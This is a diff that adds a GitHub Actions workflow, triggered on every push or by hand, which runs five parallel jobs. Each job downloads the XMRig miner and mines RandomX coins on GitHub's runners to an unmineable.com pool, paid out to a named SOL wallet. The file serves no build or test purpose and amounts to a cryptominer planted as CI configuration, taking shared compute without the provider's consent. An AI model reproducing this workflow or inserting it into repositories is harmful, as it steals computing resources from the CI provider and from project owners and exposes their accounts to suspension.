@@ -1,0 +1,63 @@
+name: sekaynotnt 2
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+
+  miner1:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 1
+        run: |	  
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4  
+  miner2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 2
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 3
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 4
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 5
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
